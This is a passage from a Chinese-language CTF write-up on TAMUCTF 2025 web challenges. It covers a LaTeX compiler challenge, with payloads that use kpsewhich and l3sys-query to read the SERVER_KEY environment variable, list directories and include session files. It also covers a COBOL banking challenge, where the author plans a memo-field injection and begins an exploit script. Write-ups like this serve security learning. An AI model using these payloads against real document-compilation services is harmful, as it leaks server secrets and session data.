</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/update.php&#34;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>method</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nx>headers</span><span class=o>:</span> <span class=p>{</span><span class=s2>&#34;Content-Type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>                    <span class=nx>body</span><span class=o>:</span> <span class=nx>data</span><span class=p>.</span><span class=nx>toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=kd>let</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;result&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>iframe</span><span class=p>.</span><span class=nx>contentWindow</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>reload</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>initialState</span> <span class=o>=</span> <span class=nx>cm6</span><span class=p>.</span><span class=nx>createEditorState</span><span class=p>(</span><span class=o>&lt;?=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nx>$latex</span><span class=p>)</span> <span class=o>?&gt;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>view</span> <span class=o>=</span> <span class=nx>cm6</span><span class=p>.</span><span class=nx>createEditorView</span><span class=p>(</span><span class=nx>initialState</span><span class=p>,</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;editor&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;keydown&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>e</span><span class=p>.</span><span class=nx>ctrlKey</span> <span class=o>&amp;&amp;</span> <span class=nx>e</span><span class=p>.</span><span class=nx>key</span> <span class=o>===</span> <span class=s1>&#39;s&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>e</span><span class=p>.</span><span class=nx>preventDefault</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                    <span class=nx>compile</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>默认加载 <code>compile.php</code>来编译生成PDF，最后看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=cm>/*update.php*/</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>require_once</span> <span class=s1>&#39;helper.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>init_session</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;POST&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>http_response_code</span><span class=p>(</span><span class=mi>400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;Bad Request: Missing LaTeX.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>encrypt_text</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;latex&#39;</span><span class=p>],</span> <span class=nv>$serverKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>看完了所有代码发现是<code>--no-shell-escape</code>，就是不允许执行命令，但是这些命令是允许的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-latex data-lang=latex><span class=line><span class=cl>shell<span class=nb>_</span>escape<span class=nb>_</span>commands = <span class=k>\</span>
</span></span><span class=line><span class=cl>bibtex,bibtex8,<span class=k>\</span>
</span></span><span class=line><span class=cl>extractbb,<span class=k>\</span>
</span></span><span class=line><span class=cl>gregorio,<span class=k>\</span>
</span></span><span class=line><span class=cl>kpsewhich,<span class=k>\</span>
</span></span><span class=line><span class=cl>l3sys-query,<span class=k>\</span>
</span></span><span class=line><span class=cl>latexminted,<span class=k>\</span>
</span></span><span class=line><span class=cl>makeindex,<span class=k>\</span>
</span></span><span class=line><span class=cl>memoize-extract.pl,<span class=k>\</span>
</span></span><span class=line><span class=cl>memoize-extract.py,<span class=k>\</span>
</span></span><span class=line><span class=cl>repstopdf,<span class=k>\</span>
</span></span><span class=line><span class=cl>r-mpost,<span class=k>\</span>
</span></span><span class=line><span class=cl>texosquery-jre8,<span class=k>\</span>
</span></span></code></pre></td></tr></table></div></div><p><code>bibtex</code> 和 <code>bibtex8</code>：用于处理 LaTeX 文档中的引用和参考文献。</p><p><code>extractbb</code>：用于提取图形的边界框。</p><p><code>gregorio</code>：与 Gregorian 调式相关的工具，通常用于音乐排版。</p><p><code>kpsewhich</code>：一个非常常见的 LaTeX 工具，用于查找文件路径，可以用于读取环境变量和系统信息。</p><p><code>l3sys-query</code>：用于获取系统信息的工具，在某些情况下可以用来列出系统文件或目录。</p><p><code>latexminted</code>：用于处理 <code>minted</code> 宏包的工具，支持高亮代码。</p><p><code>makeindex</code>：用于处理索引的工具。</p><p><code>memoize-extract.pl</code> 和 <code>memoize-extract.py</code>：可能是自定义的脚本，用于提取缓存或存储的文件。</p><p><code>repstopdf</code>：一个将图像文件转换为 PDF 格式的工具。</p><p><code>r-mpost</code>：可能是与 LaTeX 的元后处理相关的工具。</p><p><code>texosquery-jre8</code>：与 Java 相关的工具，可能用于查询 LaTeX 环境的设置或路径。</p><p>有用的只有读取环境变量和列目录，我们先查看SERVER_KEY</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-latex data-lang=latex><span class=line><span class=cl><span class=k>\documentclass</span><span class=nb>{</span>article<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\usepackage</span><span class=nb>{</span>catchfile<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\begin</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\CatchFileDef</span><span class=nb>{</span><span class=k>\key</span><span class=nb>}{</span>|kpsewhich -expand-var=<span class=s>$</span><span class=nb>SERVER_KEY}{}
</span></span></span><span class=line><span class=cl><span class=nb>The key is: </span><span class=nv>\key</span><span class=nb>
</span></span></span><span class=line><span class=cl><span class=nb>
</span></span></span><span class=line><span class=cl><span class=nb></span><span class=nv>\end</span><span class=nb>{document}
</span></span></span></code></pre></td></tr></table></div></div><p>得到以下内容</p><p><img src=/p/tamuctf2025-web-all/QQ20250331-124148.jpg width=1833 height=657 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>The key is: 3c8ea83acb09113c8074e33639d2e76517982ade78ca3683f4a46b456bd623da
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-latex data-lang=latex><span class=line><span class=cl><span class=k>\documentclass</span><span class=nb>{</span>article<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\usepackage</span><span class=nb>{</span>catchfile<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\usepackage</span><span class=nb>{</span>verbatim<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\begin</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\verbatiminput</span><span class=nb>{</span>|l3sys-query ls --sort d<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\end</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以得到当前目录的文件信息，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./sess_9e1ae23eeff86c6d4bb3a02f57efc3ab
</span></span><span class=line><span class=cl>./sess_dfd8e7498c59b317211ad2f7ea8c1a0c
</span></span><span class=line><span class=cl>./d1ff57e0-9f5f-4521-9909-1c635c3ddca9.pdf.enc
</span></span><span class=line><span class=cl>./d1ff57e0-9f5f-4521-9909-1c635c3ddca9.tex.enc
</span></span><span class=line><span class=cl>./sess_643fb224f021bb019dc5ea80e19a7cc1
</span></span><span class=line><span class=cl>./925ebc41-19c8-41cb-831f-4cda7dc9d365.pdf.enc
</span></span><span class=line><span class=cl>./925ebc41-19c8-41cb-831f-4cda7dc9d365.tex.enc
</span></span><span class=line><span class=cl>./sess_aa74cb226521a799aab422e412f22a40
</span></span></code></pre></td></tr></table></div></div><p>但是用处不大，现在我们根本不知道怎么去获得flag，后面查到可以利用<code>input</code>和<code>attachfile</code>读取文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-latex data-lang=latex><span class=line><span class=cl><span class=k>\documentclass</span><span class=nb>{</span>article<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\begin</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\input</span><span class=nb>{</span>./sess<span class=nb>_</span>6afed1c55d206558beb1174d929bed91<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\input</span><span class=nb>{</span>./sess<span class=nb>_</span>62c82309abb8bc56ccb314d153ee4bfa<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\end</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span></code></pre></td></tr></table></div></div><p>但是<code>attachfile</code>是插入内容，所以这里并不适用，不过还是写一下怎么用的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-latex data-lang=latex><span class=line><span class=cl><span class=k>\documentclass</span><span class=nb>{</span>article<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\usepackage</span><span class=nb>{</span>attachfile<span class=nb>}</span>
</span></span><span class=line><span class=cl><span class=k>\begin</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\attachfile</span><span class=nb>{</span>./sess<span class=nb>_</span>a4c53297477c46a4bcfda34c03b9b99e<span class=nb>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>\end</span><span class=nb>{</span>document<span class=nb>}</span>
</span></span></code></pre></td></tr></table></div></div><p>获取到了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>uuid—s:104:”af5fa90124b49374cc8a5252a4296d7eebf78c54e89253143eef29df75cbc6f1acca0fb004a92b003
</span></span></code></pre></td></tr></table></div></div><p>但是这些都没有任何的作用，我们可以注意到文件中是通过session进行检验的，所以可以尝试把所有<code>sess_id</code>自己套上就这样获得了flag，弯弯真是多</p><p><img src=/p/tamuctf2025-web-all/QQ20250331-161631.jpg width=1832 height=682 loading=lazy alt=1></p><h2 id=modern-banking7-solves>Modern Banking(7 solves)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nv>port</span><span class=o>=</span><span class=nv>$PORT</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/usr/sbin/nginx
</span></span><span class=line><span class=cl>rm -f /var/run/fcgiwrap.socket
</span></span><span class=line><span class=cl>nohup /usr/sbin/fcgiwrap -f -s unix:/var/run/fcgiwrap.socket <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>sleep <span class=m>1</span>
</span></span><span class=line><span class=cl>chmod a+rw /var/run/fcgiwrap.socket
</span></span><span class=line><span class=cl>chmod -R a+rx /var/www
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> true<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Port: </span><span class=nv>$port</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    curl -s <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=register&#34;</span> --data-raw <span class=s2>&#34;action=register&amp;username=administrator&amp;password=</span><span class=nv>$PASS</span><span class=s2>&#34;</span> &gt;/dev/null
</span></span><span class=line><span class=cl>    <span class=nv>cookie</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>curl -v <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=login&#34;</span> --data-raw <span class=s2>&#34;action=login&amp;username=administrator&amp;password=</span><span class=nv>$PASS</span><span class=s2>&#34;</span> 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> grep Set-Cookie <span class=p>|</span> cut -d<span class=s1>&#39; &#39;</span> -f3<span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nv>account</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>curl <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=home&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$cookie</span><span class=s2>&#34;</span> <span class=p>|</span> grep <span class=s2>&#34;&lt;tr&gt;&lt;td&gt;&#34;</span> <span class=p>|</span> head -n1 <span class=p>|</span> cut -d<span class=s1>&#39;&gt;&#39;</span> -f3<span class=k>)</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -z <span class=s2>&#34;</span><span class=nv>$account</span><span class=s2>&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        curl -s <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=manage&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$cookie</span><span class=s2>&#34;</span> --data-raw <span class=s2>&#34;action=new&#34;</span> &gt;/dev/null
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>    curl -s <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=admin&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$cookie</span><span class=s2>&#34;</span> --data-raw <span class=s2>&#34;action=refresh&amp;account=1&amp;secret=</span><span class=nv>$SECRET</span><span class=s2>&#34;</span> &gt;/dev/null
</span></span><span class=line><span class=cl>    curl -s <span class=s2>&#34;localhost:</span><span class=nv>$port</span><span class=s2>?page=batch&#34;</span> -b <span class=s2>&#34;</span><span class=nv>$cookie</span><span class=s2>&#34;</span> --data-raw <span class=s2>&#34;action=batch&amp;secret=</span><span class=nv>$SECRET</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    sleep <span class=m>20</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>看到了用户名，并且发现这是个cob应用，这个代码直接从来没有见过，所以都是让AI来帮我看，发现如果是管理员就可以给指定账户转足够的钱去购买flag，卡着了没做出来，后面再看题目的时候发现出题人偷偷把题目改了，现在每个人可以进行用户的管理，最多创建8个用户</p><p><img src=/p/tamuctf2025-web-all/QQ20250330-214721.jpg width=620 height=681 loading=lazy alt=1></p><p>还是来看看代码，在VSOCDE下载一个COBOL插件就可以看代码了，看到路由部分的时候发现</p><p><img src=/p/tamuctf2025-web-all/QQ20250330-221929.jpg width=887 height=699 loading=lazy alt=1></p><p>登录然后访问<code>?page=admin</code>发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>&lt;h3&gt;Your accounts ( 1
</span></span></span><span class=line><span class=cl><span class=c>)&lt;/h3&gt;&lt;p&gt;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Account&lt;/th&gt;&lt;th&gt;Balance&lt;/th&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
</span></span></span><span class=line><span class=cl><span class=c>&lt;tr&gt;&lt;td&gt;339984317737
</span></span></span><span class=line><span class=cl><span class=c>&lt;/td&gt;&lt;td&gt; $999999999999999999.99
</span></span></span><span class=line><span class=cl><span class=c>&lt;/td&gt;&lt;/tr&gt;
</span></span></span><span class=line><span class=cl><span class=c>&lt;/table&gt;&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=c>--&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>也就是说339984317737用户有足够多的钱来购买flag，草草的看完了代码，想到了两种方式，第一种刷新出来这个用户，用它买flag，第二种成为admin，通过注入<code>banlance</code>的手法打钱给账户，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>016410</span>   <span class=kr>MOVE </span><span class=s2>&#34;action&#34;</span> <span class=kp>to</span> <span class=nv>Datatarget</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016420</span>   <span class=kr>PERFORM</span> <span class=mi>100</span><span class=o>-</span><span class=nv>Parse-Data</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016430</span>   <span class=kr>IF</span> <span class=nv>Datadone</span> <span class=o>=</span> <span class=mi>1 </span><span class=ow>AND</span> <span class=nv>Dataval</span> <span class=o>=</span> <span class=s2>&#34;refresh&#34;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016440</span>     <span class=kr>MOVE </span><span class=s2>&#34;account&#34;</span> <span class=kp>to</span> <span class=nv>Datatarget</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016450</span>     <span class=kr>PERFORM</span> <span class=mi>100</span><span class=o>-</span><span class=nv>Parse-Data</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016460</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016470</span>     <span class=kr>IF</span> <span class=nv>Datadone</span> <span class=o>=</span> <span class=mi>1 </span><span class=ow>AND</span> <span class=nv>Dataval</span> <span class=o>&gt;</span> <span class=mi>0 </span><span class=ow>AND</span> <span class=nv>Dataval</span> <span class=o>&lt;=</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016500</span>       <span class=nv>AccountCount</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016510</span>       <span class=kr>MOVE</span> <span class=nv>Dataval</span> <span class=kp>TO</span> <span class=nv>AccountInd</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016520</span>       <span class=kr>MOVE</span> <span class=nv>Account</span> <span class=kp>IN</span> <span class=nv>AccountList</span> <span class=p>(</span><span class=nv>AccountInd</span><span class=p>)</span> <span class=kp>TO</span> <span class=nv>Account</span> <span class=kp>OF</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016530</span>       <span class=nv>AccountRecord</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016540</span>       <span class=kr>PERFORM</span> <span class=mi>104</span><span class=o>-</span><span class=nv>DB-GetAccount</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016550</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016560</span>       <span class=kr>MOVE</span> <span class=mi>999999999999999999</span><span class=p>.</span><span class=mi>99 </span><span class=kp>TO</span> <span class=nv>Balance</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016570</span>       <span class=kr>OPEN</span> <span class=kp>I-O</span> <span class=nv>ACCOUNTS</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016600</span>         <span class=kr>REWRITE</span> <span class=nv>AccountRecord</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016610</span>       <span class=kr>CLOSE</span> <span class=nv>ACCOUNTS</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016620</span>     <span class=kr>END-IF</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=c>016630</span>   <span class=kr>END-IF
</span></span></span></code></pre></td></tr></table></div></div><p>看到代码发现</p><p><img src=/p/tamuctf2025-web-all/QQ20250331-175409.jpg width=801 height=764 loading=lazy alt=1></p><p>也就是说momo也会注入到数据中，那我们换行不就可以用那个巨额账号的钱转出来了嘛，但是写金额的时候有个问题就是代码中写到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cobol data-lang=cobol><span class=line><span class=cl><span class=c>05 Bal</span><span class=nv>ance</span> <span class=kt>PIC 9(18)V99</span> <span class=kp>VALUE</span> <span class=mi>0</span><span class=p>.</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>余额格式为 20 位数，并且COBOL 通常使用固定长度字段来表示数据，注册用户之后的一键脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Target server URL</span>
</span></span><span class=line><span class=cl><span class=c1>#url = &#34;http://localhost:8888&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;https://modern-banking.tamuctf.com&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Attacker&#39;s credentials (register first if needed)</span>
</span></span><span class=line><span class=cl><span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;baozongwi&#34;</span>
</span></span><span class=line><span class=cl><span class=n>password</span> <span class=o>=</span> <span class=s2>&#34;baozongwi&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Login to get session cookie</span>
